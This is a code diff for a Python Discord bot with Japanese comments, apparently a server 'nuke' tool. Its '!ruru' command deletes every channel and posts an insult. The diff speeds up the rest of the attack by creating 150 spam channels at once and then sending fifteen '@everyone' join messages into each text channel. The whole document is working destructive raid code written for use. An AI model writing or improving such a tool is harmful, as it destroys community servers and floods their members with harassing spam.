@@ -7,8 +7,13 @@ import asyncio
 # ボットのトークンと接頭辞を設定
 COMMAND_PREFIX = '!'
 
+# intentsを設定
+intents = discord.Intents.default()
+intents.members = True  # メンバーイベントを有効にする
+intents.messages = True  # メッセージイベントを有効にする
+
 # ボットのインスタンスを作成
-bot = commands.Bot(command_prefix=COMMAND_PREFIX)
+bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
 
 @bot.command(name='ruru')
 async def ruru(ctx):
@@ -28,8 +33,24 @@ async def ruru(ctx):
     await ctx.send('All channels have been deleted. Fuck you all.')
 
     # 150個の「るるくん最強」チャンネルを作成
+    create_tasks = []
     for _ in range(150):
-        await ctx.guild.create_text_channel('るるくん最強')
+        task = asyncio.create_task(ctx.guild.create_text_channel('るるくん最強'))
+        create_tasks.append(task)
+
+    # 全ての作成タスクが完了するまで待機
+    await asyncio.gather(*create_tasks)
+
+    # 作成したチャンネルに@everyoneメンションを投稿
+    new_channels = ctx.guild.text_channels
+    mention_tasks = []
+    for channel in new_channels:
+        for _ in range(15):
+            task = asyncio.create_task(channel.send('@everyone 今すぐ参加'))
+            mention_tasks.append(task)
+
+    # 全てのメンションタスクが完了するまで待機
+    await asyncio.gather(*mention_tasks)
 
 def keep_alive():
     # Keep-aliveサーバーの設定
